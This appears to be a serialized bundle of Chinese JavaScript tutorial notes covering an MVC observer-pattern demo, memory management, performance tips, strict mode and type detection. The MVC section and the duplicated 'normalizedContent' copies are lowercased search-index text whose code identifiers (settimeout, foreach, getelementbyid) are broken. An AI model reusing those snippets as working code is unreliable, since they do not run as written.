mvc的基础是观察者模式，这是实现model和view同步的关键\n\n借助观察者模式，实现在调用model的set方法改变其值的时候，模板也同步更新，但这样的实现却很别扭，因为需要手动监听model值的改变（通过watch方法）并传入一个回调函数，在使用binding方法，绑定model和view\n\n<div id=\"div1\"></div>\n<div id=\"div2\"></div>\n<script>\n\tfunction model(value) {\n\t    this._value = typeof value === 'undefined' ? '' : value;\n\t    this._listeners = [];\n\t}\n\tmodel.prototype.set = function (value) {\n\t    var self = this;\n\t    self._value = value;\n\t    // model中的值改变时，应通知注册过的回调函数\n\t    // 按照javascript事件处理的一般机制，我们异步地调用回调函数\n\t    // 如果觉得settimeout影响性能，也可以采用requestanimationframe\n\t    settimeout(function () {\n\t        self._listeners.foreach(function (listener) {\n\t            listener.call(self, value);\n\t        });\n\t\t});\n\t};\n\tmodel.prototype.watch = function (listener) {\n\t    // 注册监听的回调函数\n\t    this._listeners.push(listener);\n\t};\n\tmodel.prototype.binding = function (node) {\n\t    // 将watch的逻辑和通用的回调函数放到这里\n\t    this.watch(function (value) {\n\t        node.innerhtml = value;\n\t    });\n\t};\n\n\n  var model = new model();\n  model.binding(document.getelementbyid('div1'));\n  model.binding(document.getelementbyid('div2'));\n  model.set('this is a div');\n<\/script>\n\n\n\n# 实现controller，将绑定从逻辑代码中解耦\n\n<div id=\"div1\" bind=\"model1\"></div>\n<div id=\"div2\" bind=\"model1\"></div>\n<script type=\"text/javascript\">\n  function controller(callback) {\n    var models = {};\n    // 找到所有有bind属性的元素\n    var views = document.queryselectorall('[bind]');\n    // 将views处理为普通数组\n    views = array.prototype.slice.call(views, 0);\n    views.foreach(function (view) {\n        var modelname = view.getattribute('bind');\n        // 取出或新建该元素所绑定的model\n        models[modelname] = models[modelname] || new model();\n        // 完成该元素和指定model的绑定\n        models[modelname].binding(view);\n    });\n    // 调用controller的具体逻辑，将models传入，方便业务处理\n    callback.call(this, models);\n  }\n  new controller(function (models) {\n      var model1 = models.model1;\n      model1.set('this is a div');\n  });\n<\/script>\n\n\n\n# 整合代码\n\nfunction model(value) {\n    this._value = typeof value === 'undefined' ? '' : value;\n    this._listeners = [];\n}\nmodel.prototype.set = function (value) {\n    var self = this;\n    self._value = value;\n    settimeout(function () {\n        self._listeners.foreach(function (listener) {\n            listener.call(self, value);\n        });\n    });\n};\nmodel.prototype.watch = function (listener) {\n    this._listeners.push(listener);\n};\nmodel.prototype.binding = function (node) {\n    this.watch(function (value) {\n        node.innerhtml = value;\n    });\n};\nfunction controller(callback) {\n    var models = {};\n    var views = array.prototype.slice.call(document.queryselectorall('[bind]'), 0);\n    views.foreach(function (view) {\n        var modelname = view.getattribute('bind');\n        (models[modelname] = models[modelname] || new model()).binding(view);\n    });\n    callback.call(this, models);\n}\n\n\n# 简单使用\n\n<span bind=\"hour\"></span> : <span bind=\"minute\"></span> : <span bind=\"second\"></span>\n<script type=\"text/javascript\">\n// controller:\nnew controller(function (models) {\n    function settime() {\n        var date = new date();\n        models.hour.set(date.gethours());\n        models.minute.set(date.getminutes());\n        models.second.set(date.getseconds());\n    }\n    settime();\n    setinterval(settime, 1000);\n});\n<\/script>\n\n\ncontroller中只负责更新model的逻辑，和view完全解耦；而view和model的绑定是通过view中的属性和框架中controller的初始化代码完成的，也没有出现在业务逻辑中；至于view的更新，也是通过框架中的观察者模式实现的。\n\n在简单的系统中应用mvc模式，会增加结构的复杂性，并且降低效率",charsets:{cjk:!0}},{title:"内存管理",frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.html",relativePath:"Javascript/Javascript扩展操作/内存管理.md",key:"v-88c9b268",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.html",headers:[{level:2,title:"内存生命周期",slug:"内存生命周期",normalizedTitle:"内存生命周期",charIndex:11},{level:2,title:"垃圾回收",slug:"垃圾回收",normalizedTitle:"垃圾回收",charIndex:440},{level:3,title:"引用",slug:"引用",normalizedTitle:"引用",charIndex:462},{level:3,title:"内存泄漏",slug:"内存泄漏",normalizedTitle:"内存泄漏",charIndex:1400},{level:3,title:"常见内存泄漏",slug:"常见内存泄漏",normalizedTitle:"常见内存泄漏",charIndex:2065}],headersStr:"内存生命周期 垃圾回收 引用 内存泄漏 常见内存泄漏",content:'# 内存管理\n\n\n# 内存生命周期\n\n不管什么程序语言，内存生命周期基本是一致的：\n\n 1. 分配你所需要的内存\n 2. 使用分配到的内存（读、写）\n 3. 不需要时将其释放、归还\n\n所有语言第二部分都是明确的。第一和第三部分在底层语言中是明确的，但在像JavaScript这些高级语言中，大部分都是隐含的。\n\njs的内存生命周期：\n\n 1. 定义变量时就完成了内存分配\n\nvar n = 123; // 给数值变量分配内存\nvar s = "azerty"; // 给字符串分配内存\nvar o = {\n  a: 1,\n  b: null\n}; // 给对象及其包含的值分配内存\nfunction f(a){\n  return a + 2;\n} // 给函数（可调用的对象）分配内存\n\n\n 2. 使用值的过程实际上是对分配内存进行读取与写入的操作。读取与写入可能是写入一个变量或者一个对象的属性值，甚至传递函数的参数。\n 3. 而内存的释放而依赖GC机制（高级语言解释器嵌入的“垃圾回收器”）。\n\n\n# 垃圾回收\n\n\n# 引用\n\n垃圾回收算法主要依赖于引用的概念。在内存管理的环境中，一个对象如果有访问另一个对象的权限（隐式或者显式），叫做一个对象引用另一个对象。例如，一个Javascript对象具有对它原型的引用（隐式引用）和对它属性的引用（显式引用）。\n\n# 引用计数垃圾收集(计数算法)\n\n把“对象是否不再需要”简化定义为“对象有没有其他对象引用到它”。如果没有引用指向该对象（零引用），对象将被垃圾回收机制回收。\n无法处理循环引用\n\n// 创建一个对象person，他有两个指向属性age和name的引用\nvar person = {\n    age: 12,\n    name: \'aaaa\'\n};\nperson.name = null;  // 虽然设置为null，但因为person对象还有指向name的引用，因此name不会回收\nvar p = person;\nperson = 1;         //原来的person对象被赋值为1，但因为有新引用p指向原person对象，因此它不会被回收\np = null;           //原person对象已经没有引用，很快会被回收\n\n\n# 循环引用(上面垃圾回收的限制)\n\nfunction fun(){\n  var obj = {};\n  var obj2 = {};\n  obj.a = obj2; // obj 引用 obj2\n  obj2.a = obj; // obj2 引用 obj\n  return "azerty";\n}\nfun();\n\n\n两个对象被创建，并互相引用，形成了一个循环。它们被调用之后会离开函数作用域，所以它们已经没有用了，可以被回收了。然而，引用计数算法考虑到它们互相都有至少一次引用，所以它们不会被回收。\n\n# 标记-清除算法\n\n现代的浏览器已经不再使用引用计数算法了。现代浏览器通用的大多是基于标记清除算法的某些改进算法，总体思想都是一致的。\n\n标记清除算法将“不再使用的对象”定义为“无法达到的对象”。简单来说，就是从根部（在JS中就是全局对象）出发定时扫描内存中的对象。凡是能从根部到达的对象，都是还需要使用的。那些无法由根部出发触及到的对象被标记为不再使用，稍后进行回收。\n\n\n# 内存泄漏\n\n对于持续运行的服务进程，必须及时释放不再用到的内存。否则，内存占用越来越高，轻则影响系统性能，重则导致进程崩溃。不再用到的内存，没有及时释放，就叫做内存泄漏。\n\n# 内存泄漏的识别方法\n\n如果连续五次垃圾回收之后，内存占用一次比一次大，就有内存泄漏。\n\n 1. 浏览器方法\n    1. 打开开发者工具，\n    2. 在顶部的Capture字段里面勾选 Memory 选择 Timeline 面板\n    3. 点击左上角的录制按钮。\n    4. 在页面上进行各种操作，模拟用户的使用情况。\n    5. 一段时间后，点击对话框的 stop 按钮，面板上就会显示这段时间的内存占用情况。\n\n如果内存占用基本平稳，接近水平，就说明不存在内存泄漏。 反之，就是内存泄漏了。\n\n 2. 命令行方法 命令行可以使用 Node 提供的 process.memoryUsage 方法。\n\nprocess.memoryUsage返回一个对象，包含了 Node 进程的内存占用信息。该对象包含四个字段，单位是字节，\n\nconsole.log(process.memoryUsage());\n//  rss:        所有内存占用，包括指令区和堆栈。\n//  heapTotal:     "堆"占用的内存，包括用到的和没用到的。\n//  heapUsed:    用到的堆的部分。\n//  external:     V8 引擎内部的 C++ 对象占用的内存。\n\n// 判断内存泄漏，以heapUsed字段为准。\n\n\n\n# 常见内存泄漏\n\n如果还需要兼容老旧浏览器，那么就需要注意代码中的循环引用问题。或者直接采用保证兼容性的库来帮助优化代码。\n\n对现代浏览器来说，唯一要注意的就是明确切断需要回收的对象与根部的联系。有时候这种联系并不明显，且因为标记清除算法的强壮性，这个问题较少出现。最常见的内存泄露一般都与DOM元素绑定有关。\n\n 1. 绝对不要定义全局变量\n    JavaScript用一个有趣的方式管理未被声明的变量：对未声明的变量的引用在全局对象里创建一个新的变量。在浏览器的情况下，这个全局对象是 window 。为了防止这种意外，可以使用严格模式来阻止\n 2. 手工解除变量引用\n    一个变量已经确切是不再需要了，那么就可以手工解除变量引用，以使其被回收。\n 3. 闭包\n 4. DOM外引用',normalizedContent:'# 内存管理\n\n\n# 内存生命周期\n\n不管什么程序语言，内存生命周期基本是一致的：\n\n 1. 分配你所需要的内存\n 2. 使用分配到的内存（读、写）\n 3. 不需要时将其释放、归还\n\n所有语言第二部分都是明确的。第一和第三部分在底层语言中是明确的，但在像javascript这些高级语言中，大部分都是隐含的。\n\njs的内存生命周期：\n\n 1. 定义变量时就完成了内存分配\n\nvar n = 123; // 给数值变量分配内存\nvar s = "azerty"; // 给字符串分配内存\nvar o = {\n  a: 1,\n  b: null\n}; // 给对象及其包含的值分配内存\nfunction f(a){\n  return a + 2;\n} // 给函数（可调用的对象）分配内存\n\n\n 2. 使用值的过程实际上是对分配内存进行读取与写入的操作。读取与写入可能是写入一个变量或者一个对象的属性值，甚至传递函数的参数。\n 3. 而内存的释放而依赖gc机制（高级语言解释器嵌入的“垃圾回收器”）。\n\n\n# 垃圾回收\n\n\n# 引用\n\n垃圾回收算法主要依赖于引用的概念。在内存管理的环境中，一个对象如果有访问另一个对象的权限（隐式或者显式），叫做一个对象引用另一个对象。例如，一个javascript对象具有对它原型的引用（隐式引用）和对它属性的引用（显式引用）。\n\n# 引用计数垃圾收集(计数算法)\n\n把“对象是否不再需要”简化定义为“对象有没有其他对象引用到它”。如果没有引用指向该对象（零引用），对象将被垃圾回收机制回收。\n无法处理循环引用\n\n// 创建一个对象person，他有两个指向属性age和name的引用\nvar person = {\n    age: 12,\n    name: \'aaaa\'\n};\nperson.name = null;  // 虽然设置为null，但因为person对象还有指向name的引用，因此name不会回收\nvar p = person;\nperson = 1;         //原来的person对象被赋值为1，但因为有新引用p指向原person对象，因此它不会被回收\np = null;           //原person对象已经没有引用，很快会被回收\n\n\n# 循环引用(上面垃圾回收的限制)\n\nfunction fun(){\n  var obj = {};\n  var obj2 = {};\n  obj.a = obj2; // obj 引用 obj2\n  obj2.a = obj; // obj2 引用 obj\n  return "azerty";\n}\nfun();\n\n\n两个对象被创建，并互相引用，形成了一个循环。它们被调用之后会离开函数作用域，所以它们已经没有用了，可以被回收了。然而，引用计数算法考虑到它们互相都有至少一次引用，所以它们不会被回收。\n\n# 标记-清除算法\n\n现代的浏览器已经不再使用引用计数算法了。现代浏览器通用的大多是基于标记清除算法的某些改进算法，总体思想都是一致的。\n\n标记清除算法将“不再使用的对象”定义为“无法达到的对象”。简单来说，就是从根部（在js中就是全局对象）出发定时扫描内存中的对象。凡是能从根部到达的对象，都是还需要使用的。那些无法由根部出发触及到的对象被标记为不再使用，稍后进行回收。\n\n\n# 内存泄漏\n\n对于持续运行的服务进程，必须及时释放不再用到的内存。否则，内存占用越来越高，轻则影响系统性能，重则导致进程崩溃。不再用到的内存，没有及时释放，就叫做内存泄漏。\n\n# 内存泄漏的识别方法\n\n如果连续五次垃圾回收之后，内存占用一次比一次大，就有内存泄漏。\n\n 1. 浏览器方法\n    1. 打开开发者工具，\n    2. 在顶部的capture字段里面勾选 memory 选择 timeline 面板\n    3. 点击左上角的录制按钮。\n    4. 在页面上进行各种操作，模拟用户的使用情况。\n    5. 一段时间后，点击对话框的 stop 按钮，面板上就会显示这段时间的内存占用情况。\n\n如果内存占用基本平稳，接近水平，就说明不存在内存泄漏。 反之，就是内存泄漏了。\n\n 2. 命令行方法 命令行可以使用 node 提供的 process.memoryusage 方法。\n\nprocess.memoryusage返回一个对象，包含了 node 进程的内存占用信息。该对象包含四个字段，单位是字节，\n\nconsole.log(process.memoryusage());\n//  rss:        所有内存占用，包括指令区和堆栈。\n//  heaptotal:     "堆"占用的内存，包括用到的和没用到的。\n//  heapused:    用到的堆的部分。\n//  external:     v8 引擎内部的 c++ 对象占用的内存。\n\n// 判断内存泄漏，以heapused字段为准。\n\n\n\n# 常见内存泄漏\n\n如果还需要兼容老旧浏览器，那么就需要注意代码中的循环引用问题。或者直接采用保证兼容性的库来帮助优化代码。\n\n对现代浏览器来说，唯一要注意的就是明确切断需要回收的对象与根部的联系。有时候这种联系并不明显，且因为标记清除算法的强壮性，这个问题较少出现。最常见的内存泄露一般都与dom元素绑定有关。\n\n 1. 绝对不要定义全局变量\n    javascript用一个有趣的方式管理未被声明的变量：对未声明的变量的引用在全局对象里创建一个新的变量。在浏览器的情况下，这个全局对象是 window 。为了防止这种意外，可以使用严格模式来阻止\n 2. 手工解除变量引用\n    一个变量已经确切是不再需要了，那么就可以手工解除变量引用，以使其被回收。\n 3. 闭包\n 4. dom外引用',charsets:{cjk:!0}},{title:"js性能优化",frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/js%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html",relativePath:"Javascript/Javascript扩展操作/js性能优化.md",key:"v-1552e756",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/js%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html",headersStr:null,content:"# js性能优化\n\n 1. 重复使用的调用结果，事先保存到局部变量\n\n//避免多次取值的调用开销\nvar h1 = element1.clientHeight + num1;\nvar h4 = element1.clientHeight + num2;\n//可以替换为：\nvar eleHeight = element1.clientHeight;\nvar h1 = eleHeight + num1;\nvar h4 = eleHeight + num2;\n\n\n 1. 避免全局查找\n    在一个函数中会用到全局对象存储为局部变量来减少全局查找，因为访问局部变量的速度要比访问全局变量的速度更快些\n\nfunction search() {\n    //当我要使用当前页面地址和主机域名\n    alert(window.location.href + window.location.host);\n}\n//最好的方式是如下这样  先用一个简单变量保存起来\nfunction search() {\n    var location = window.location;\n    alert(location.href + location.host);\n}    \n\n\n 3. 浮点数转换成整型\n    parseInt()是用于将字符串转换成数字，而不是浮点数和整型之间的转换，应该使用Math.floor()或者Math.round()\n\n 4. 各种类型转换\n\nvar myVar = \"3.14159\",\nstr = \"\" + myVar, //  to string  \ni_int = ~ ~myVar,  //  to integer  \nf_float = 1 * myVar,  //  to float  \nb_bool = !!myVar,  /*  to boolean - any string with length\n                        and any number except 0 are true */\narray = [myVar];  //  to array  \n\n\n如果定义了toString()方法来进行类型转换的话，推荐显式调用toString()，因为内部的操作在尝试所有可能性之后，会尝试对象的toString()方法尝试能否转化为String，所以直接调用这个方法效率会更高\n\n 4. 使用一次innerHTML赋值代替构建dom元素 对于大的DOM更改，使用innerHTML要比使用标准的DOM方法创建同样的DOM结构快得多。\n\nvar frag = document.createDocumentFragment();\nfor (var i = 0; i < 1000; i++) {\n    var el = document.createElement('p');\n    el.innerHTML = i;\n    frag.appendChild(el);\n}\ndocument.body.appendChild(frag);\n//可以替换为：\nvar html = [];\nfor (var i = 0; i < 1000; i++) {\n    html.push('<p>' + i + '</p>');\n}\ndocument.body.innerHTML = html.join('');\n\n\n 5. 删除dom节点之前,一定要删除注册在该节点上的事件 否则将会产生无法回收的内存。另外，在removeChild和innerHTML=’’二者之间,尽量选择后者. 因为在sIEve(内存泄露监测工具)中监测的结果是用removeChild无法有效地释放dom节点\n\n 6. 使用事件代理\n    任何可以冒泡的事件都不仅仅可以在事件目标上进行处理，目标的任何祖先节点上也能处理，使用这个知识就可以将事件处理程序附加到更高的地方负责多个目标的事件处理，同样，对于内容动态增加并且子节点都需要相同的事件处理函数的情况，可以把事件注册提到父节点上，这样就不需要为每个子节点注册事件监听了。另外，现有的js库都采用observe方式来创建事件监听,其实现上隔离了dom对象和事件处理函数之间的循环引用,所以应该尽量采用这种方式来创建事件监听\n\n 7. 避免双重解释\n    \n    * 尽量少使用eval函数\n    * 不要使用Function构造器\n\n 8. 通过javascript创建的dom对象，必须append到页面中\n\n> IE下，脚本创建的dom对象，如果没有append到页面中，刷新页面，这部分内存是不会回收的！\n\n 8.  尽量使用原生方法\n 9.  条件分支\n     * 将条件分支，按可能性顺序从高到低排列：可以减少解释器对条件的探测次数\n     * 在同一条件子的多（>2）条件分支时，使用switch优于if：switch分支选择的效率高于if，在IE下尤为明显。4分支的测试，IE下switch的执行时间约为if的一半。\n     * 使用三目运算符替代条件分支\n 10. 优化循环\n     * 减值迭代\n     * 简化终止条件\n     * 简化循环体\n     * 使用后测试循环\n\n> 在JavaScript中，我们可以使用for(;😉,while(),for(in)三种循环，事实上，这三种循环中for(in)的效率极差，因为他需要查询散列键，只要可以，就应该尽量少用。for(;;)和while循环，while循环的效率要优于for(;😉，可能是因为for(;;)结构的问题，需要经常跳转回去。",normalizedContent:"# js性能优化\n\n 1. 重复使用的调用结果，事先保存到局部变量\n\n//避免多次取值的调用开销\nvar h1 = element1.clientheight + num1;\nvar h4 = element1.clientheight + num2;\n//可以替换为：\nvar eleheight = element1.clientheight;\nvar h1 = eleheight + num1;\nvar h4 = eleheight + num2;\n\n\n 1. 避免全局查找\n    在一个函数中会用到全局对象存储为局部变量来减少全局查找，因为访问局部变量的速度要比访问全局变量的速度更快些\n\nfunction search() {\n    //当我要使用当前页面地址和主机域名\n    alert(window.location.href + window.location.host);\n}\n//最好的方式是如下这样  先用一个简单变量保存起来\nfunction search() {\n    var location = window.location;\n    alert(location.href + location.host);\n}    \n\n\n 3. 浮点数转换成整型\n    parseint()是用于将字符串转换成数字，而不是浮点数和整型之间的转换，应该使用math.floor()或者math.round()\n\n 4. 各种类型转换\n\nvar myvar = \"3.14159\",\nstr = \"\" + myvar, //  to string  \ni_int = ~ ~myvar,  //  to integer  \nf_float = 1 * myvar,  //  to float  \nb_bool = !!myvar,  /*  to boolean - any string with length\n                        and any number except 0 are true */\narray = [myvar];  //  to array  \n\n\n如果定义了tostring()方法来进行类型转换的话，推荐显式调用tostring()，因为内部的操作在尝试所有可能性之后，会尝试对象的tostring()方法尝试能否转化为string，所以直接调用这个方法效率会更高\n\n 4. 使用一次innerhtml赋值代替构建dom元素 对于大的dom更改，使用innerhtml要比使用标准的dom方法创建同样的dom结构快得多。\n\nvar frag = document.createdocumentfragment();\nfor (var i = 0; i < 1000; i++) {\n    var el = document.createelement('p');\n    el.innerhtml = i;\n    frag.appendchild(el);\n}\ndocument.body.appendchild(frag);\n//可以替换为：\nvar html = [];\nfor (var i = 0; i < 1000; i++) {\n    html.push('<p>' + i + '</p>');\n}\ndocument.body.innerhtml = html.join('');\n\n\n 5. 删除dom节点之前,一定要删除注册在该节点上的事件 否则将会产生无法回收的内存。另外，在removechild和innerhtml=’’二者之间,尽量选择后者. 因为在sieve(内存泄露监测工具)中监测的结果是用removechild无法有效地释放dom节点\n\n 6. 使用事件代理\n    任何可以冒泡的事件都不仅仅可以在事件目标上进行处理，目标的任何祖先节点上也能处理，使用这个知识就可以将事件处理程序附加到更高的地方负责多个目标的事件处理，同样，对于内容动态增加并且子节点都需要相同的事件处理函数的情况，可以把事件注册提到父节点上，这样就不需要为每个子节点注册事件监听了。另外，现有的js库都采用observe方式来创建事件监听,其实现上隔离了dom对象和事件处理函数之间的循环引用,所以应该尽量采用这种方式来创建事件监听\n\n 7. 避免双重解释\n    \n    * 尽量少使用eval函数\n    * 不要使用function构造器\n\n 8. 通过javascript创建的dom对象，必须append到页面中\n\n> ie下，脚本创建的dom对象，如果没有append到页面中，刷新页面，这部分内存是不会回收的！\n\n 8.  尽量使用原生方法\n 9.  条件分支\n     * 将条件分支，按可能性顺序从高到低排列：可以减少解释器对条件的探测次数\n     * 在同一条件子的多（>2）条件分支时，使用switch优于if：switch分支选择的效率高于if，在ie下尤为明显。4分支的测试，ie下switch的执行时间约为if的一半。\n     * 使用三目运算符替代条件分支\n 10. 优化循环\n     * 减值迭代\n     * 简化终止条件\n     * 简化循环体\n     * 使用后测试循环\n\n> 在javascript中，我们可以使用for(;😉,while(),for(in)三种循环，事实上，这三种循环中for(in)的效率极差，因为他需要查询散列键，只要可以，就应该尽量少用。for(;;)和while循环，while循环的效率要优于for(;😉，可能是因为for(;;)结构的问题，需要经常跳转回去。",charsets:{cjk:!0}},{title:"严格模式(use strict)",frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F.html",relativePath:"Javascript/Javascript扩展操作/严格模式.md",key:"v-df1d0324",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F.html",headers:[{level:2,title:"使用严格模式",slug:"使用严格模式",normalizedTitle:"使用严格模式",charIndex:64},{level:3,title:'使用 \\"use strict\\"指令',slug:"使用-use-strict-指令",normalizedTitle:"使用 &quot;use strict&quot;指令",charIndex:null},{level:3,title:"为什么使用严格模式",slug:"为什么使用严格模式",normalizedTitle:"为什么使用严格模式",charIndex:279},{level:2,title:"严格模式的限制",slug:"严格模式的限制",normalizedTitle:"严格模式的限制",charIndex:591}],headersStr:'使用严格模式 使用 \\"use strict\\"指令 为什么使用严格模式 严格模式的限制',content:'# 严格模式(use strict)\n\nJavaScript 严格模式（strict mode）即在严格的条件下运行。\n\n\n# 使用严格模式\n\n> "use strict" 指令只允许出现在脚本或函数的开头。\n\n\n# 使用 "use strict"指令\n\n"use strict" 指令在 JavaScript 1.8.5 (ECMAScript5) 中新增。它不是一条语句，但是是一个字面量表达式，在 JavaScript 旧版本中会被忽略。\n\n"use strict" 的目的是指定代码在严格条件下执行。例如：严格模式下你不能使用未声明的变量。\n\n\n# 为什么使用严格模式\n\n消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;\n\n * 消除代码运行的一些不安全之处，保证代码运行的安全；\n * 提高编译器效率，增加运行速度；\n * 为未来新版本的Javascript做好铺垫。\n\n"严格模式"体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经支持它，许多大项目已经开始全面拥抱它。\n\n另一方面，同样的代码，在"严格模式"中，可能会有不一样的运行结果；一些在"正常模式"下可以运行的语句，在"严格模式"下将不能运行。掌握这些内容，有助于更细致深入地理解Javascript，让你变成一个更好的程序员。\n\n\n# 严格模式的限制\n\n不允许使用未声明的变量：\n\n"use strict"\nx = 100;   // 报错 x 未定义\n\n\n不允许删除变量或对象：\n\n"use strict"\nvar pi = 3.1415;\ndelete pi; // 报错\n\nvar o = {};\ndelete o;  // 报错\n\n\n不允许变量重名:\n\n"use strict";\nfunction x(p1, p1) {};   // 报错\n\n\n不允许使用八进制:\n\n"use strict";\nvar x = 010;             // 报错\n\n\n不允许使用转义字符:\n\n"use strict";\nvar x = \\010;            // 报错\n\n\n不允许删除一个不允许删除的属性：\n\n"use strict";\ndelete Object.prototype; // 报错\n\n\n变量名不能使用 "eval"、"arguments"\n\n由于一些安全原因，在作用域 eval() 创建的变量不能被调用：\n\n"use strict";\neval ("var x = 2");\nalert (x);               // 报错\n\n\n禁止this关键字指向全局对象。\n\nfunction f(){\n    return !this;\n}\n// 返回false，因为"this"指向全局对象，"!this"就是false\n\nfunction f(){\n    "use strict";\n    return !this;\n}\n// 返回true，因为严格模式下，this的值为undefined，所以"!this"为true。\n\n\nfunction f(){\n    "use strict";\n    this.a = 1;\n};\nf();// 报错，this未定义\n\n\n保留关键字,为了向将来Javascript的新版本过渡，严格模式新增了一些保留关键字：\n\nimplements、interface、let、package、private、protected、public、static、yield\n',normalizedContent:'# 严格模式(use strict)\n\njavascript 严格模式（strict mode）即在严格的条件下运行。\n\n\n# 使用严格模式\n\n> "use strict" 指令只允许出现在脚本或函数的开头。\n\n\n# 使用 "use strict"指令\n\n"use strict" 指令在 javascript 1.8.5 (ecmascript5) 中新增。它不是一条语句，但是是一个字面量表达式，在 javascript 旧版本中会被忽略。\n\n"use strict" 的目的是指定代码在严格条件下执行。例如：严格模式下你不能使用未声明的变量。\n\n\n# 为什么使用严格模式\n\n消除javascript语法的一些不合理、不严谨之处，减少一些怪异行为;\n\n * 消除代码运行的一些不安全之处，保证代码运行的安全；\n * 提高编译器效率，增加运行速度；\n * 为未来新版本的javascript做好铺垫。\n\n"严格模式"体现了javascript更合理、更安全、更严谨的发展方向，包括ie 10在内的主流浏览器，都已经支持它，许多大项目已经开始全面拥抱它。\n\n另一方面，同样的代码，在"严格模式"中，可能会有不一样的运行结果；一些在"正常模式"下可以运行的语句，在"严格模式"下将不能运行。掌握这些内容，有助于更细致深入地理解javascript，让你变成一个更好的程序员。\n\n\n# 严格模式的限制\n\n不允许使用未声明的变量：\n\n"use strict"\nx = 100;   // 报错 x 未定义\n\n\n不允许删除变量或对象：\n\n"use strict"\nvar pi = 3.1415;\ndelete pi; // 报错\n\nvar o = {};\ndelete o;  // 报错\n\n\n不允许变量重名:\n\n"use strict";\nfunction x(p1, p1) {};   // 报错\n\n\n不允许使用八进制:\n\n"use strict";\nvar x = 010;             // 报错\n\n\n不允许使用转义字符:\n\n"use strict";\nvar x = \\010;            // 报错\n\n\n不允许删除一个不允许删除的属性：\n\n"use strict";\ndelete object.prototype; // 报错\n\n\n变量名不能使用 "eval"、"arguments"\n\n由于一些安全原因，在作用域 eval() 创建的变量不能被调用：\n\n"use strict";\neval ("var x = 2");\nalert (x);               // 报错\n\n\n禁止this关键字指向全局对象。\n\nfunction f(){\n    return !this;\n}\n// 返回false，因为"this"指向全局对象，"!this"就是false\n\nfunction f(){\n    "use strict";\n    return !this;\n}\n// 返回true，因为严格模式下，this的值为undefined，所以"!this"为true。\n\n\nfunction f(){\n    "use strict";\n    this.a = 1;\n};\nf();// 报错，this未定义\n\n\n保留关键字,为了向将来javascript的新版本过渡，严格模式新增了一些保留关键字：\n\nimplements、interface、let、package、private、protected、public、static、yield\n',charsets:{cjk:!0}},{title:"数据类型检测",frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B.html",relativePath:"Javascript/Javascript扩展操作/数据类型检测.md",key:"v-d3a1b5fe",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B.html",headers:[{level:2,title:"操作符 typeof",slug:"操作符-typeof",normalizedTitle:"操作符 typeof",charIndex:13},{level:3,title:"语法",slug:"语法",normalizedTitle:"语法",charIndex:28},{level:3,title:"返回值",slug:"返回值",normalizedTitle:"返回值",charIndex:92},{level:3,title:"示例",slug:"示例",normalizedTitle:"示例",charIndex:330},{level:2,title:"prototype",slug:"prototype",normalizedTitle:"prototype",charIndex:891},{level:3,title:"语法",slug:"语法-2",normalizedTitle:"语法",charIndex:28},{level:3,title:"示例",slug:"示例-2",normalizedTitle:"示例",charIndex:330},{level:3,title:"根据对象的constructor判断",slug:"根据对象的constructor判断",normalizedTitle:"根据对象的constructor判断",charIndex:2445},{level:3,title:"instanceof 运算符",slug:"instanceof-运算符",normalizedTitle:"instanceof 运算符",charIndex:2798}],headersStr:"操作符 typeof 语法 返回值 示例 prototype 语法 示例 根据对象的constructor判断 instanceof 运算符",content:"# 数据类型检测\n\n\n# 操作符 typeof\n\n\n# 语法\n\ntypeof运算符后跟操作数：\n\ntypeof operand\n// or\ntypeof (operand)\n\n\n\n# 返回值\n\n下表总结了typeof可能的返回值\n\n类型          结果\nUndefined   \"undefined\"\nNull        \"object\"\nBoolean     \"boolean\"\nNumber      \"number\"\nBigInt      \"bigint\"\nString      \"string\"\nSymbol      \"symbol\"\n函数          \"function\"\n任何其他对象      \"object\"\n\n\n# 示例\n\n// boolean\ntypeof true === 'boolean'\ntypeof false === 'boolean'\n// undefined\ntypeof undefined ==='undefined'\n// Number\ntypeof 37 === 'number';\ntypeof NaN === 'number';\ntypeof Math.PI === 'number';\n// bigint\ntypeof 1n ==='bigint'\n// String\ntypeof \"\" === 'string';\ntypeof \"bla\" === 'string';\ntypeof (typeof 1) === 'string'; // typeof总是返回一个字符串\n// Object\ntypeof {a:1} === 'object';\ntypeof [1, 2, 4] === 'object';\ntypeof null === 'object';    //特殊值null被认为是一个空的对象引用\n\n\nTIP\n\n严格来讲，函数在 ECMAScript 中被认为是对象，并不代表一种数据类型。可是，函数也有自己特殊的属性。为此，就有必要通过 typeof 操作符来区分函数和其他对象。\n\n\n# prototype\n\n\n# 语法\n\nObject.prototype.toString.call(x)   //[object x]\n\n\n\n# 示例\n\nconsole.log(Object.prototype.toString.call(new Date()))     // [object Date]\nconsole.log(Object.prototype.toString.call(null)            // [object Null]\nconsole.log(Object.prototype.toString.call(new Array()))    // [object Array]\nconsole.log(Object.prototype.toString.call('dd'))           // [object String]\nconsole.log(Object.prototype.toString.call(undefined))      // [object Undefined]\nconsole.log(Object.prototype.toString.call(Symbol('d')))    // [object Symbol]\nconsole.log(Object.prototype.toString.call(Function))       // [object Function]\nconsole.log(Object.prototype.toString.call(1n))             // [object BigInt]\n\n\n\n这种方法能够很好的检测出各种类型。\n\nfunction isType(data,type){\n    if(Object.prototype.toString.call(data) 